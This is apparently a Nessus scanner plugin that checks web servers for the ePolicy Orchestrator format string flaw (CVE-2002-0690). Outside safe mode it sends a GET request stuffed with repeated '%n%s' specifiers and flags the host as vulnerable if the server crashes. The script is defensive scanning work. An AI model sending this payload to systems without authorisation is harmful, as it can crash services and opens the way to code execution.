# 
# This script is (C) Renaud Deraison
#
#
# *Untested*. Probably redundant with plugin# 11075.


if(description)
{
 script_id(11409);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2003-t-0006");
 script_bugtraq_id(7111);
 script_version ("$Revision: 1.7 $");
 script_cve_id("CVE-2002-0690");

 name["english"] = "ePolicy orchestrator format string";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote web server is vulnerable to a
format string attack.

If it is ePolicy Orchestrator, an attacker may use this flaw
to execute code with the SYSTEM privileges on this host.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "ePolicy Orchestrator vulnerable to format string";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 8081);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include('global_settings.inc');



function check(port)
{
 if (safe_checks()) 
 {
	if ( report_paranoia < 2 ) exit(0);
   	# To be confirmed...
   	req = http_get(item:"/SERVER.INI", port:port);
	res = http_keepalive_send_recv(port:port, data:req);
	if( res != NULL )
	{
	if(("DataSource" >< res && "AgentHttpPort" >< res && "MaxHttpConnection" >< res) ||
	  ("Server: Spipe/1.0" >< res && "MIME-version: 1.0" >< res))
	{
	 report = "
The remote web server is vulnerable to a format string bug.

If it is ePolicy Orchestrator, an attacker may use this flaw
to execute code with the SYSTEM privileges on this host.

*** Since safe checks are enabled, Nessus did not actually
*** check for this flaw, so this might be a false positive

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";
	  security_hole(port:port, data:report);
	}
	}
	return(0);
 }
 if(http_is_dead(port: port)) { return(0); }

 soc = http_open_socket(port);
 if(! soc) return(0);

 req = http_get(item:string("/", crap(data:"%n%s", length: 64)), port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);

 if (http_is_dead(port: port)) { security_hole(port); }
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:8081);
foreach port (ports)
{
 check(port:port);
}
